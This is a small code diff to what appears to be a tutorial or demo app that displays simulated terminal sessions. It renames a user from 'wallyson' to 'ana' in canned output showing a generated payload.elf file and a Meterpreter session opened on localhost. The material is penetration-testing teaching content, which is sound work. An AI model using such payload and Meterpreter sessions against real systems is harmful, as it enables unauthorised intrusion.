@@ -91,7 +91,7 @@ Saved as: payload.elf`,
           },
           {
             cmd: "ls -la payload.elf && file payload.elf",
-            out: `-rw-r--r-- 1 wallyson wallyson 239 Apr  3 13:42 payload.elf
+            out: `-rw-r--r-- 1 ana ana 239 Apr  3 13:42 payload.elf
 payload.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header`,
             outType: "info",
           },
@@ -328,7 +328,7 @@ exploit"
 [*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:42718)
 
 meterpreter > getuid
-Server username: wallyson @ kali
+Server username: ana @ kali
 meterpreter > sysinfo
 Computer    : kali
 OS          : Debian 13 (Linux 6.10.6-amd64)
